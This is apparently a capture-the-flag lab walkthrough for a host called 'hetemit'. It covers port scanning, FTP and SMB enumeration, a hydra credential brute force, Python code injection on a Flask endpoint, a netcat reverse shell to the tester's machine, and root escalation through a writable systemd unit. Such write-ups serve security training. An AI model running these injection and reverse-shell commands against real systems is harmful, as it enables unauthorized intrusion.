## RECON
```bash
# IP ADDRESS
192.168.198.117

# HOSTNAME
hetemit

# WEB SERVER
Apache httpd 2.4.37 ((centos))

# OPERATING SYSTEM
centos
```
## OPEN PORTS
```bash
21/tcp    open  ftp         syn-ack ttl 61 vsftpd 3.0.3
22/tcp    open  ssh         syn-ack ttl 61 OpenSSH 8.0 (protocol 2.0)
80/tcp    open  http        syn-ack ttl 61 Apache httpd 2.4.37 ((centos))
139/tcp   open  netbios-ssn syn-ack ttl 61 Samba smbd 4.6.2
445/tcp   open  netbios-ssn syn-ack ttl 61 Samba smbd 4.6.2
18000/tcp open  biimenu?    syn-ack ttl 61
50000/tcp open  http        syn-ack ttl 61 Werkzeug httpd 1.0.1 (Python 3.6.8)
```
## NMAP OUTPUT
```bash
# Nmap 7.94SVN scan initiated Fri Nov 15 09:15:13 2024 as: /usr/lib/nmap/nmap -p- -sC -sV -vv -oN nmap/scan-script-version 192.168.198.117
Nmap scan report for 192.168.198.117
Host is up, received echo-reply ttl 61 (0.036s latency).
Scanned at 2024-11-15 09:15:15 IST for 159s
Not shown: 65528 filtered tcp ports (no-response)
PORT      STATE SERVICE     REASON         VERSION
21/tcp    open  ftp         syn-ack ttl 61 vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.45.203
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open  ssh         syn-ack ttl 61 OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 b1:e2:9d:f1:f8:10:db:a5:aa:5a:22:94:e8:92:61:65 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDH2Cap49zuKy70lHzXsOn9iOap0h1Dnwk14D6PNKugueOqGpYoffwCGCA0wF4cI3+MRjuHz4xGznmtTIP3vOBZINZvT5PsNcvu6ef0SDfDOMFbzsEirhpQuoBYvgmEuJ4u1VMiwNaYQ0jw9t+nsR2MAIym/wdKt+ghYm4qlB3WvLMV41uCu0F7OQadRX8GWrLWLucjSQ1f80tkV7mc7ZfuTm8YdsAOkNQufHkVE+Alk0NpHdqLh/6FHxmEqYwP0jX6HS/lg+MfczIbIQ91v7+ljvo3qgdSZPqqulUtQuj/Rb/gmIfItzFZIxTzLQ6FuKKmoTMXaR/tXf93+91z+kBdDaZe/5eu6fLCdGuFyioB97LdZGJq8uFbM0BpNeBYc0i/DOFwxWBhO8/zzv1uaTUKuS1B+bny1iUTiQoJj6GVRQmvgk/2Km5SanF3Cp4PSSJMQ112Umjg1T61ah/i//KXAyZ25xOznolBw/aoCc9cremrkycUp7dmuATBNCgHFS0=
|   256 74:dd:fa:f2:51:dd:74:38:2b:b2:ec:82:e5:91:82:28 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPTMpDGmoKZ96W+Ivvw7sQmnD1U41OY34oAzJ5Z1/AP/iVj+TpKO6lCKPxDq+9nbJJU4dtQx8X+KjQqUtpYIUhw=
|   256 48:bc:9d:eb:bd:4d:ac:b3:0b:5d:67:da:56:54:2b:a0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEUnTSrfkvL2AJJsozjPtXIWf/6Z7UB9WptTiOOX93m4
80/tcp    open  http        syn-ack ttl 61 Apache httpd 2.4.37 ((centos))
|_http-server-header: Apache/2.4.37 (centos)
|_http-title: CentOS \xE6\x8F\x90\xE4\xBE\x9B\xE7\x9A\x84 Apache HTTP \xE6\x9C\x8D\xE5\x8A\xA1\xE5\x99\xA8\xE6\xB5\x8B\xE8\xAF\x95\xE9\xA1\xB5
| http-methods: 
|   Supported Methods: HEAD GET POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
139/tcp   open  netbios-ssn syn-ack ttl 61 Samba smbd 4.6.2
445/tcp   open  netbios-ssn syn-ack ttl 61 Samba smbd 4.6.2
18000/tcp open  biimenu?    syn-ack ttl 61
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Content-Type: text/html; charset=UTF-8
|     Content-Length: 3102
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8" />
|     <title>Action Controller: Exception caught</title>
|     <style>
|     body {
|     background-color: #FAFAFA;
|     color: #333;
|     margin: 0px;
|     body, p, ol, ul, td {
|     font-family: helvetica, verdana, arial, sans-serif;
|     font-size: 13px;
|     line-height: 18px;
|     font-size: 11px;
|     white-space: pre-wrap;
|     pre.box {
|     border: 1px solid #EEE;
|     padding: 10px;
|     margin: 0px;
|     width: 958px;
|     header {
|     color: #F0F0F0;
|     background: #C52F24;
|     padding: 0.5em 1.5em;
|     margin: 0.2em 0;
|     line-height: 1.1em;
|     font-size: 2em;
|     color: #C52F24;
|     line-height: 25px;
|     .details {
|_    bord
50000/tcp open  http        syn-ack ttl 61 Werkzeug httpd 1.0.1 (Python 3.6.8)
| http-methods: 
|_  Supported Methods: HEAD GET OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-server-header: Werkzeug/1.0.1 Python/3.6.8
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port18000-TCP:V=7.94SVN%I=7%D=11/15%Time=6736C43A%P=x86_64-pc-linux-gnu
SF:%r(GenericLines,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(GetR
SF:equest,C76,"HTTP/1\.0\x20403\x20Forbidden\r\nContent-Type:\x20text/html
SF:;\x20charset=UTF-8\r\nContent-Length:\x203102\r\n\r\n<!DOCTYPE\x20html>
SF:\n<html\x20lang=\"en\">\n<head>\n\x20\x20<meta\x20charset=\"utf-8\"\x20
SF:/>\n\x20\x20<title>Action\x20Controller:\x20Exception\x20caught</title>
SF:\n\x20\x20<style>\n\x20\x20\x20\x20body\x20{\n\x20\x20\x20\x20\x20\x20b
SF:ackground-color:\x20#FAFAFA;\n\x20\x20\x20\x20\x20\x20color:\x20#333;\n
SF:\x20\x20\x20\x20\x20\x20margin:\x200px;\n\x20\x20\x20\x20}\n\n\x20\x20\
SF:x20\x20body,\x20p,\x20ol,\x20ul,\x20td\x20{\n\x20\x20\x20\x20\x20\x20fo
SF:nt-family:\x20helvetica,\x20verdana,\x20arial,\x20sans-serif;\n\x20\x20
SF:\x20\x20\x20\x20font-size:\x20\x20\x2013px;\n\x20\x20\x20\x20\x20\x20li
SF:ne-height:\x2018px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20pre\x20{\n\x2
SF:0\x20\x20\x20\x20\x20font-size:\x2011px;\n\x20\x20\x20\x20\x20\x20white
SF:-space:\x20pre-wrap;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20pre\.box\x20
SF:{\n\x20\x20\x20\x20\x20\x20border:\x201px\x20solid\x20#EEE;\n\x20\x20\x
SF:20\x20\x20\x20padding:\x2010px;\n\x20\x20\x20\x20\x20\x20margin:\x200px
SF:;\n\x20\x20\x20\x20\x20\x20width:\x20958px;\n\x20\x20\x20\x20}\n\n\x20\
SF:x20\x20\x20header\x20{\n\x20\x20\x20\x20\x20\x20color:\x20#F0F0F0;\n\x2
SF:0\x20\x20\x20\x20\x20background:\x20#C52F24;\n\x20\x20\x20\x20\x20\x20p
SF:adding:\x200\.5em\x201\.5em;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20h1\x
SF:20{\n\x20\x20\x20\x20\x20\x20margin:\x200\.2em\x200;\n\x20\x20\x20\x20\
SF:x20\x20line-height:\x201\.1em;\n\x20\x20\x20\x20\x20\x20font-size:\x202
SF:em;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20h2\x20{\n\x20\x20\x20\x20\x20
SF:\x20color:\x20#C52F24;\n\x20\x20\x20\x20\x20\x20line-height:\x2025px;\n
SF:\x20\x20\x20\x20}\n\n\x20\x20\x20\x20\.details\x20{\n\x20\x20\x20\x20\x
SF:20\x20bord")%r(HTTPOptions,C76,"HTTP/1\.0\x20403\x20Forbidden\r\nConten
SF:t-Type:\x20text/html;\x20charset=UTF-8\r\nContent-Length:\x203102\r\n\r
SF:\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n\x20\x20<meta\x20c
SF:harset=\"utf-8\"\x20/>\n\x20\x20<title>Action\x20Controller:\x20Excepti
SF:on\x20caught</title>\n\x20\x20<style>\n\x20\x20\x20\x20body\x20{\n\x20\
SF:x20\x20\x20\x20\x20background-color:\x20#FAFAFA;\n\x20\x20\x20\x20\x20\
SF:x20color:\x20#333;\n\x20\x20\x20\x20\x20\x20margin:\x200px;\n\x20\x20\x
SF:20\x20}\n\n\x20\x20\x20\x20body,\x20p,\x20ol,\x20ul,\x20td\x20{\n\x20\x
SF:20\x20\x20\x20\x20font-family:\x20helvetica,\x20verdana,\x20arial,\x20s
SF:ans-serif;\n\x20\x20\x20\x20\x20\x20font-size:\x20\x20\x2013px;\n\x20\x
SF:20\x20\x20\x20\x20line-height:\x2018px;\n\x20\x20\x20\x20}\n\n\x20\x20\
SF:x20\x20pre\x20{\n\x20\x20\x20\x20\x20\x20font-size:\x2011px;\n\x20\x20\
SF:x20\x20\x20\x20white-space:\x20pre-wrap;\n\x20\x20\x20\x20}\n\n\x20\x20
SF:\x20\x20pre\.box\x20{\n\x20\x20\x20\x20\x20\x20border:\x201px\x20solid\
SF:x20#EEE;\n\x20\x20\x20\x20\x20\x20padding:\x2010px;\n\x20\x20\x20\x20\x
SF:20\x20margin:\x200px;\n\x20\x20\x20\x20\x20\x20width:\x20958px;\n\x20\x
SF:20\x20\x20}\n\n\x20\x20\x20\x20header\x20{\n\x20\x20\x20\x20\x20\x20col
SF:or:\x20#F0F0F0;\n\x20\x20\x20\x20\x20\x20background:\x20#C52F24;\n\x20\
SF:x20\x20\x20\x20\x20padding:\x200\.5em\x201\.5em;\n\x20\x20\x20\x20}\n\n
SF:\x20\x20\x20\x20h1\x20{\n\x20\x20\x20\x20\x20\x20margin:\x200\.2em\x200
SF:;\n\x20\x20\x20\x20\x20\x20line-height:\x201\.1em;\n\x20\x20\x20\x20\x2
SF:0\x20font-size:\x202em;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20h2\x20{\n
SF:\x20\x20\x20\x20\x20\x20color:\x20#C52F24;\n\x20\x20\x20\x20\x20\x20lin
SF:e-height:\x2025px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20\.details\x20{
SF:\n\x20\x20\x20\x20\x20\x20bord");
Service Info: OS: Unix

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-11-15T03:47:13
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 33070/tcp): CLEAN (Timeout)
|   Check 2 (port 56068/tcp): CLEAN (Timeout)
|   Check 3 (port 15484/udp): CLEAN (Timeout)
|   Check 4 (port 6275/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: -1s
```
## ENUMERATION
```bash
# FTP
21/tcp    open  ftp         syn-ack ttl 61 vsftpd 3.0.3
------------------------------------------------------------------------------------------------------------------
- anonymous login check
sudo ftp ftp://anonymous:anonymous@$ip
	- Login successful
	- Unable to list contents :( | 229 Entering Extended Passive Mode (|||9867|)
- Bruteforce default creds
sudo hydra -v -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt -f ftp://$ip
	- [21][ftp] host: 192.168.198.117   login: anonymous   password: anonymous                      


# SMB
139/tcp   open  netbios-ssn syn-ack ttl 61 Samba smbd 4.6.2
445/tcp   open  netbios-ssn syn-ack ttl 61 Samba smbd 4.6.2
------------------------------------------------------------------------------------------------------------------
- Listing shares using smbclient
sudo smbclient -L $ip
Anonymous login successful
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
Cmeeks          Disk      cmeeks Files
IPC$            IPC       IPC Service (Samba 4.11.2)

- Listing shares using enum4linux
sudo enum4linux -a $ip
//192.168.198.117/print$        Mapping: DENIED Listing: N/A Writing: N/A
//192.168.198.117/Cmeeks        Mapping: OK Listing: DENIED Writing: N/A
//192.168.198.117/IPC$  Mapping: N/A Listing: N/A Writing: N/A

- Accessing share //192.168.198.117/Cmeeks using smbclient
sudo smbclient //$ip/Cmeeks
Anonymous login successful
smb: \> dir
NT_STATUS_ACCESS_DENIED listing \*
	- Unable to find files :(
touch test.txt
smb: \> put test.txt 
NT_STATUS_ACCESS_DENIED opening remote file \test.txt
	- Unable to upload files :(

# HTTP
80/tcp    open  http        syn-ack ttl 61 Apache httpd 2.4.37 ((centos))
------------------------------------------------------------------------------------------------------------------
- Apache test page


50000/tcp open  http        syn-ack ttl 61 Werkzeug httpd 1.0.1 (Python 3.6.8)
------------------------------------------------------------------------------------------------------------------
- env 
export url=http://$ip:50000

- whatweb
HTTPServer[Werkzeug/1.0.1 Python/3.6.8], IP[192.168.198.117], Python[3.6.8], Werkzeug[1.0.1]

- curl
sudo curl -vs $url
{'/generate', '/verify'}
sudo curl -vs $url/generate
{'email@domain'}
sudo curl -vs $url/verify
{'code'}

- Sending data to code to see if it executes
sudo curl -s $url/verify --data 'code=7*7'
49
	- Code executed as 7*7=49 did the math
	- Since its a python server - check for python code execution
# Reference - https://stackoverflow.com/questions/89228/how-do-i-execute-a-program-or-call-a-system-command
- Check able to get request from machine to our kali machine
sudo nc -nvlp 80
sudo curl -s $url/verify --data 'code=os.system("wget 192.168.45.203")'
connect to [192.168.45.203] from (UNKNOWN) [192.168.198.117] 58436
GET / HTTP/1.1
User-Agent: Wget/1.19.5 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 192.168.45.203
Connection: Keep-Alive

# ?
18000/tcp open  biimenu?    syn-ack ttl 61
------------------------------------------------------------------------------------------------------------------

# SSH
22/tcp    open  ssh         syn-ack ttl 61 OpenSSH 8.0 (protocol 2.0)
------------------------------------------------------------------------------------------------------------------


```
## INITIAL FOOTHOLD
```bash
# Reverse Shell
sudo nc -nvlp 80
sudo curl -s $url/verify --data 'code=os.system("nc -e /bin/bash 192.168.45.203 80")'
connect to [192.168.45.203] from (UNKNOWN) [192.168.198.117] 58440
id
uid=1000(cmeeks) gid=1000(cmeeks) groups=1000(cmeeks)
whoami
cmeeks

# Users with bash shell
root:x:0:0:root:/root:/bin/bash
cmeeks:x:1000:1000::/home/cmeeks:/bin/bash
postgres:x:26:26:PostgreSQL Server:/var/lib/pgsql:/bin/bash
```
## PRIVILEGE ESCALATION
```bash
# sudo -l
(root) NOPASSWD: /sbin/halt, /sbin/reboot, /sbin/poweroff

# Running linpeas.sh
You have write privileges over /etc/systemd/system/pythonapp.service
cat /etc/systemd/system/pythonapp.service
[Unit]
Description=Python App
After=network-online.target

[Service]
Type=simple
WorkingDirectory=/home/cmeeks/restjson_hetemit
ExecStart=flask run -h 0.0.0.0 -p 50000
TimeoutSec=30
RestartSec=15s
User=Cmeeks
ExecReload=/bin/kill -USR1 $MAINPID
Restart=on-failure

[Install]
WantedBy=multi-user.target

# Privesc
- Change User=Cmeeks to User=root
sudo /sbin/reboot

- Get reverse shell as root user
sudo nc -nvlp 80
sudo curl -s $url/verify --data 'code=os.system("nc -e /bin/bash 192.168.45.203 80")'

# root
```
